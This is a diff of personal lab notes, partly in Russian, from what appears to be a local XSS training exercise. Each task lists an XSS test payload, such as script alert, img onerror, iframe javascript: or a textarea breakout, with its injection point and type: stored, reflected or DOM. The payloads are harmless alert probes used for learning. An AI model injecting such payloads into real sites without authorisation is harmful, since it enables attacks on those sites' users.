@@ -51,8 +51,9 @@ Stored, Reflected, DOM-Based, Self, Blind XSS
 # LAB1
 
 ## TASK1
-
+```
 <script>alert('p1-1')</script> or <script>alert(1)</script>
+```
 1) post metod, http://localhost:3847/practice/1/1, bio
 2) STORED XSS
 
@@ -62,14 +63,16 @@ Stored, Reflected, DOM-Based, Self, Blind XSS
 2) reflected xss, да пропадет.
 
 ## TASK 3
-
+```
 "><img src="x" onerror="prompt(1)">
+```
 1) and title
 2) stored xss, имя только
 
 ## TASK 4
-
+```
 <img src=x onerror="alert(1)">
+```
 1) link, nothing
 2) reflected xss, да нужен
 
@@ -79,9 +82,10 @@ Stored, Reflected, DOM-Based, Self, Blind XSS
 2) нету, dom xss
 
 ## TASK 6
-
+```
 <iframe src=javascript:alert(1)>
 <img src=x onerror=alert(1)>
+```
 1) только в тексте 
 2) stored xss, только в тексте нужен payload
 
@@ -99,14 +103,17 @@ Stored xss
 
 ## TASK 9
 
-</textarea> <img src=x onerror=alert(1)>
+```
+ </textarea> <img src=x onerror=alert(1)>
+```
 1) ?code, no
 2) dom xss, ПРИ TAG НЕТУ, ПРИ CОDE ЕСТЬ
 
 ## TASK 10
 
-</div><div> fkbcjbj </div>
+```</div><div> fkbcjbj </div>
 <img src=x onerror=alert(1)>
+```
 1) no
 2) нету запроса на сервер
 
